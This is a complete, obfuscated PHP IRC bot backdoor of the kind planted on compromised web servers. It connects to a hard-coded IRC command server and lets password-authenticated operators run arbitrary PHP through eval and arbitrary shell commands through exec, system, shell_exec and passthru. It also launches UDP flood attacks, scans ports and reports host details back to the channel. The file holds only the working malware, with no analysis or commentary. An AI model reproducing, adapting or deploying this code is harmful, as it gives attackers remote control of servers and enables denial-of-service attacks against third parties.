<?php set_time_limit(0); error_reporting(0);  class jbbNBzBVZJNvZFbNB {

 var $nJRfvzjvZZFZnjJ = array("rNVrNVNJBzbZbfjF"=>"gangbang.angels-agency.nl",
                     "VrVB"=>"23232",
                     "NVNJr"=>"scary",
                     "jnRZZZ"=>"13",
                     "lthXl"=>"#wWw#",
                     "jbn"=>"scan",
                     "ZfjrJZNVF"=>"41aa15390e2efa34ac693c3bd7cb8e88",
                     "FFrVBRRrzf"=>".",
                     "zVnrZzJbfbr"=>"a87710e60dee7645081a8fc2fab74dbd");
                      var $JrZzRZZZRbBVbjbfjF = array(); 
function EeYQyMqEqemEia() 
 { 
    while(!feof($this->oGOOgKWsk)) 
    { 
       $this->aaEUY = trim(fgets($this->oGOOgKWsk,512)); 
       $ZBZJrfFFzJJbB = explode(" ",$this->aaEUY); 
       if(substr($this->aaEUY,0,6)=="PING :") 
       { 
          $this->ymEmYiA("PONG :".substr($this->aaEUY,6)); 
       } 
       if(isset($ZBZJrfFFzJJbB[1]) && $ZBZJrfFFzJJbB[1] =="004") 
       { 
          $this->ymEmYiA("JOIN ".$this->nJRfvzjvZZFZnjJ['lthXl']." ".$this->nJRfvzjvZZFZnjJ['jbn']."");
          $this->qyyuUa($this->nJRfvzjvZZFZnjJ['lthXl'],$this->nJRfvzjvZZFZnjJ['jbn']);
          $this->QqIQYMuQUMiaAYMIyQE();
       } 
       if(isset($ZBZJrfFFzJJbB[1]) && $ZBZJrfFFzJJbB[1]=="433") 
       { 
          $this->AYUyUMUQiiAQiymu(); 
       }
       if($this->aaEUY != $jVF_DLP) 
       { 
          $bFRVvnzVJnNFNV = array(); 
          $kCw = substr(strstr($this->aaEUY," :"),2); 
          $goWC = explode(" ",$kCw); 
          $WKOCW = explode("!",$ZBZJrfFFzJJbB[0]); 
          $gKOcgc = explode("@",$WKOCW[1]); 
          $gKOcgc = $gKOcgc[1]; 
          $WKOCW = substr($WKOCW[0],1); 
          $CcCoGck = $ZBZJrfFFzJJbB[0]; 
          if($goWC[0]==$this->WKOCW) 
          { 
           for($X=0;$X<count($goWC);$X++) 
              $bFRVvnzVJnNFNV[$X] = $goWC[$X+1]; 
          } 
          else 
          { 
           for($X=0;$X<count($goWC);$X++) 
              $bFRVvnzVJnNFNV[$X] = $goWC[$X]; 
          } 
          if(count($ZBZJrfFFzJJbB)>2) 
          { 
             switch($ZBZJrfFFzJJbB[1]) 
             { 
                case "QUIT": 
                   if($this->aeemIMEmYmqY($CcCoGck)) 
                   { 
                      $this->qmiqEYUq($CcCoGck); 
                   } 
                break; 
                case "PART": 
                   if($this->aeemIMEmYmqY($CcCoGck)) 
                   { 
                      $this->qmiqEYUq($CcCoGck); 
                   } 
                break; 
                case "PRIVMSG": 
                   if(!$this->aeemIMEmYmqY($CcCoGck) && (md5($gKOcgc) == $this->nJRfvzjvZZFZnjJ['zVnrZzJbfbr'] || $this->nJRfvzjvZZFZnjJ['zVnrZzJbfbr'] == "*")) 
                   { 
                      if(substr($bFRVvnzVJnNFNV[0],0,1)==$this->nJRfvzjvZZFZnjJ['FFrVBRRrzf']) 
                      { 
                         switch(substr($bFRVvnzVJnNFNV[0],1)) 
                         { 
                            case "user": 
                              if(md5($bFRVvnzVJnNFNV[1])==$this->nJRfvzjvZZFZnjJ['ZfjrJZNVF']) 
                              { 
                                 $this->mqMAeQEiI($CcCoGck);
                              } 
                              else 
                              { 
                                 $this->aAIaYAEuQI($this->nJRfvzjvZZFZnjJ['lthXl'],"[\002Auth\002]: Fout password $WKOCW idioot!!");
                              } 
                            break; 
                         } 
                      } 
                   }
                   elseif($this->aeemIMEmYmqY($CcCoGck)) 
                   { 
                      if(substr($bFRVvnzVJnNFNV[0],0,1)==$this->nJRfvzjvZZFZnjJ['FFrVBRRrzf']) 
                      { 
                         switch(substr($bFRVvnzVJnNFNV[0],1)) 
                         {                            case "eval":
                              $eval = eval(substr(strstr($kCw,$bFRVvnzVJnNFNV[1]),strlen($bFRVvnzVJnNFNV[1])));
                            break;                            case "exec": 
                               $SCsgGcKgGkWk = substr(strstr($kCw,$bFRVvnzVJnNFNV[0]),strlen($bFRVvnzVJnNFNV[0])+1); 
                               $OgsCWKWOgWGOK = exec($SCsgGcKgGkWk); 
                               $sWsoogKSCSwccG = explode("\n",$OgsCWKWOgWGOK); 
                               for($X=0;$X<count($sWsoogKSCSwccG);$X++) 
                                  if($sWsoogKSCSwccG[$X]!=NULL) 
                                     $this->iMUiEeuuMUm($this->nJRfvzjvZZFZnjJ['lthXl'],"      : ".trim($sWsoogKSCSwccG[$X])); 
                            break;                            case "sexec":
                               $SCsgGcKgGkWk = substr(strstr($kCw,$bFRVvnzVJnNFNV[0]),strlen($bFRVvnzVJnNFNV[0])+1); 
                               $OgsCWKWOgWGOK = shell_exec($SCsgGcKgGkWk); 
                               $sWsoogKSCSwccG = explode("\n",$OgsCWKWOgWGOK); 
                               for($X=0;$X<count($sWsoogKSCSwccG);$X++) 
                                  if($sWsoogKSCSwccG[$X]!=NULL) 
                                     $this->iMUiEeuuMUm($this->nJRfvzjvZZFZnjJ['lthXl'],"      : ".trim($sWsoogKSCSwccG[$X])); 
                            break;                            case "die": 
                               $this->ymEmYiA("QUIT :die command from $WKOCW");
                               fclose($this->oGOOgKWsk); 
                               exit;                            case "dns": 
                               if(isset($bFRVvnzVJnNFNV[1])) 
                               { 
                                  $KO = explode(".",$bFRVvnzVJnNFNV[1]); 
                                  if(count($KO)==4 && is_numeric($KO[0]) && is_numeric($KO[1]) && is_numeric($KO[2]) && is_numeric($KO[3])) 
                                  { 
                                     $this->iMUiEeuuMUm($this->nJRfvzjvZZFZnjJ['lthXl'],"[\002dns\002]: ".$bFRVvnzVJnNFNV[1]." => ".gethostbyaddr($bFRVvnzVJnNFNV[1])); 
                                  } 
                                  else 
                                  { 
                                     $this->iMUiEeuuMUm($this->nJRfvzjvZZFZnjJ['lthXl'],"[\002dns\002]: ".$bFRVvnzVJnNFNV[1]." => ".gethostbyname($bFRVvnzVJnNFNV[1])); 
                                  } 
                               } 
                            break;                            case "udpflood": 
                               if(count($bFRVvnzVJnNFNV)>3) 
                               { 
                                  $this->mieAaYimYAYYQqyIUY($bFRVvnzVJnNFNV[1],$bFRVvnzVJnNFNV[2],$bFRVvnzVJnNFNV[3]); 
                               } 
                            break;                            case "rndnick": 
                               $this->AYUyUMUQiiAQiymu(); 
                            break;                            case "restart": 
                               $this->ymEmYiA("QUIT :gerestart door $WKOCW");
                               fclose($this->oGOOgKWsk); 
                               $this->uUuuYQMeAyyia(); 
                            break;                            case "info":
                               $this->QqIQYMuQUMiaAYMIyQE();
                            break;                            case "system": 
                               $SCsgGcKgGkWk = substr(strstr($kCw,$bFRVvnzVJnNFNV[0]),strlen($bFRVvnzVJnNFNV[0])+1); 
                               $OgsCWKWOgWGOK = system($SCsgGcKgGkWk); 
                               $sWsoogKSCSwccG = explode("\n",$OgsCWKWOgWGOK); 
                               for($X=0;$X<count($sWsoogKSCSwccG);$X++) 
                                  if($sWsoogKSCSwccG[$X]!=NULL) 
                                     $this->iMUiEeuuMUm($this->nJRfvzjvZZFZnjJ['lthXl'],"      : ".trim($sWsoogKSCSwccG[$X])); 
                            break;                            case "raw":
                               $this->ymEmYiA(strstr($kCw,$bFRVvnzVJnNFNV[1])); 
                            break;                            case "logout": 
                               $this->qmiqEYUq($CcCoGck); 
                               $this->iMUiEeuuMUm($this->nJRfvzjvZZFZnjJ['lthXl'],"[\002Auth\002]\00314 Je bent nu uitgelogt $WKOCW"); 
                            break;                            case "passthru": 
                               $SCsgGcKgGkWk = substr(strstr($kCw,$bFRVvnzVJnNFNV[0]),strlen($bFRVvnzVJnNFNV[0])+1); 

                               $OgsCWKWOgWGOK = passthru($SCsgGcKgGkWk); 
                               $sWsoogKSCSwccG = explode("\n",$OgsCWKWOgWGOK); 
                               for($X=0;$X<count($sWsoogKSCSwccG);$X++) 
                                  if($sWsoogKSCSwccG[$X]!=NULL) 
                                     $this->iMUiEeuuMUm($this->nJRfvzjvZZFZnjJ['lthXl'],"      : ".trim($sWsoogKSCSwccG[$X])); 
                            break;                            case "pscan": 
                               if(count($bFRVvnzVJnNFNV) > 2) 
                               { 
                                  if(fsockopen($bFRVvnzVJnNFNV[1],$bFRVvnzVJnNFNV[2],$e,$s,15)) 
                                     $this->iMUiEeuuMUm($this->nJRfvzjvZZFZnjJ['lthXl'],"[\002pscan\002]: ".$bFRVvnzVJnNFNV[1].":".$bFRVvnzVJnNFNV[2]." is \2open\2"); 
                                  else 
                                     $this->iMUiEeuuMUm($this->nJRfvzjvZZFZnjJ['lthXl'],"[\002pscan\002]: ".$bFRVvnzVJnNFNV[1].":".$bFRVvnzVJnNFNV[2]." is \2closed\2"); 
                               } 
                            break;                         } 
                      } 
                   } 
                break; 
             } 
          } 
       } 
       $jVF_DLP = $this->aaEUY; 
    } 
    $this->uUuuYQMeAyyia(); 
 } function AqAyIyiyEaeqIquim() {
  $LxXHDt = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';	
  $lXPPLxt = strlen($LxXHDt);
  for($X=0;$X<6;$X++) {
	$yaQ .= $LxXHDt[rand(0,$lXPPLxt-1)];
  }
  if(php_uname() == "") { $HdHthTlP = "---"; } else { $HdHthTlP = php_uname(); }
  $this->ymEmYiA("USER ".$yaQ."-go 127.0.0.1 localhost :".$HdHthTlP."");
 } function aeemIMEmYmqY($phXH) 
 { 
    if(isset($this->JrZzRZZZRbBVbjbfjF[$phXH])) 
       return 1; 
    else 
       return 0; 
 } function AYUyUMUQiiAQiymu() {
  $LxXHDt = '[abcdefghijklm)nopqrstuvwxyz_ABCDEFGHIJKLM(NOPQRSTUVWXYZ-0123456789]';	
  $lXPPLxt = strlen($LxXHDt);
  for($X=0;$X<$this->nJRfvzjvZZFZnjJ['jnRZZZ'];$X++) {
	$yaQ .= $LxXHDt[rand(0,$lXPPLxt-1)];
  }
  $this->ymEmYiA("NICK ".$yaQ."");
 } function qyyuUa($lthXl,$jbn=NULL) 
 { 
    $this->ymEmYiA("JOIN $lthXl $jbn"); 
 } function ymEmYiA($dLP) 
 { 
    fwrite($this->oGOOgKWsk,"$dLP\r\n"); 
 } function QqIQYMuQUMiaAYMIyQE() {
	if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $hhpThlppLDL = "\0034ON\003"; } else { $hhpThlppLDL = "\0039OFF\003"; }

	$HdHthTlP = php_uname();
	if($HdHthTlP == "") { $FJKclt = "\00315---\003"; } else { $FJKclt = "\00315".$HdHthTlP."\003"; }
		 
	 $Zbsw = "\00315http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."\003";
	 
	 $TpgOo =  getcwd()."";
	 
	 $lOKc = "\00315".$TpgOo."\003";

	$cWCKScgCCW = fileperms("$TpgOo");

	if (($cWCKScgCCW & 0xC000) == 0xC000) { $KWCWGWsCkkg = 's';
	} elseif (($cWCKScgCCW & 0xA000) == 0xA000) { $KWCWGWsCkkg = 'l';
	} elseif (($cWCKScgCCW & 0x8000) == 0x8000) { $KWCWGWsCkkg = '-';
	} elseif (($cWCKScgCCW & 0x6000) == 0x6000) { $KWCWGWsCkkg = 'b';
	} elseif (($cWCKScgCCW & 0x4000) == 0x4000) { $KWCWGWsCkkg = 'd';
	} elseif (($cWCKScgCCW & 0x2000) == 0x2000) { $KWCWGWsCkkg = 'c';
	} elseif (($cWCKScgCCW & 0x1000) == 0x1000) { $KWCWGWsCkkg = 'p';
	} else { $KWCWGWsCkkg = 'u'; }

	$KWCWGWsCkkg .= (($cWCKScgCCW & 0x0100) ? 'r' : '-');
	$KWCWGWsCkkg .= (($cWCKScgCCW & 0x0080) ? 'w' : '-');
	$KWCWGWsCkkg .= (($cWCKScgCCW & 0x0040) ?	(($cWCKScgCCW & 0x0800) ? 's' : 'x' ) :	(($cWCKScgCCW & 0x0800) ? 'S' : '-'));

	$KWCWGWsCkkg .= (($cWCKScgCCW & 0x0020) ? 'r' : '-');
	$KWCWGWsCkkg .= (($cWCKScgCCW & 0x0010) ? 'w' : '-');
	$KWCWGWsCkkg .= (($cWCKScgCCW & 0x0008) ?	(($cWCKScgCCW & 0x0400) ? 's' : 'x' ) :	(($cWCKScgCCW & 0x0400) ? 'S' : '-'));

	$KWCWGWsCkkg .= (($cWCKScgCCW & 0x0004) ? 'r' : '-');
	$KWCWGWsCkkg .= (($cWCKScgCCW & 0x0002) ? 'w' : '-');
	$KWCWGWsCkkg .= (($cWCKScgCCW & 0x0001) ?	(($cWCKScgCCW & 0x0200) ? 't' : 'x' ) :	(($cWCKScgCCW & 0x0200) ? 'T' : '-'));
			
	$Frlt = "\00315".$KWCWGWsCkkg."\003";

	$this->iMUiEeuuMUm($this->nJRfvzjvZZFZnjJ['lthXl'],"\00314[SAFE:\003\002 $hhpThlppLDL\002\00314]\00315 $Zbsw \00314[pwd:]\00315 $lOKc \00314(\003$Frlt\00314) [uname:]\00315 $FJKclt");
 } function iMUiEeuuMUm($dP,$dLP)
 {
    $this->ymEmYiA("PRIVMSG $dP :$dLP");
 } function mieAaYimYAYYQqyIUY($phXH,$lTXhxXdltp,$uIUA) {
	$this->iMUiEeuuMUm($this->nJRfvzjvZZFZnjJ['lthXl'],"[\002UdpFlood Gestart!\002]"); 
	$pTxLxtXLx = "";
	for($X=0;$X<$lTXhxXdltp;$X++) { $pTxLxtXLx .= chr(mt_rand(1,256)); }
	$dDTpp = time();
	$X = 0;
	while(time()-$dDTpp < $uIUA) {
		$bT=fsockopen("udp://".$phXH,mt_rand(0,6000),$e,$s,5);
      	fwrite($bT,$pTxLxtXLx);
       	fclose($bT);
		$X++;
	}
	$Vkd = $X * $lTXhxXdltp;
	$Vkd = $Vkd / 1048576;
	$XZw = $Vkd / $uIUA;
	$XZw = round($XZw);
	$Vkd = round($Vkd);
	$this->iMUiEeuuMUm($this->nJRfvzjvZZFZnjJ['lthXl'],"[\002UdpFlood Afgerond!\002]: $Vkd MB verzonden / gemiddelde: $XZw MB/s ");
 } function mqMAeQEiI($phXH) 
 { 
    $this->JrZzRZZZRbBVbjbfjF[$phXH] = true; 
 } function aAIaYAEuQI($dP,$dLP)
 {
    $this->ymEmYiA("NOTICE $dP :$dLP");
 } function qmiqEYUq($phXH) 
 { 
    unset($this->JrZzRZZZRbBVbjbfjF[$phXH]); 
 } function uUuuYQMeAyyia() 
 { 
    if(!($this->oGOOgKWsk = fsockopen($this->nJRfvzjvZZFZnjJ['rNVrNVNJBzbZbfjF'],$this->nJRfvzjvZZFZnjJ['VrVB'],$e,$s,30))) 
    $this->uUuuYQMeAyyia(); 
    $this->AqAyIyiyEaeqIquim();
    if(strlen($this->nJRfvzjvZZFZnjJ['NVNJr'])>0) 
    $this->ymEmYiA("PASS ".$this->nJRfvzjvZZFZnjJ['NVNJr']);
    $this->AYUyUMUQiiAQiymu();
    $this->EeYQyMqEqemEia();
 }}
$gkOOWSww = new jbbNBzBVZJNvZFbNB;
$gkOOWSww->uUuuYQMeAyyia(); ?>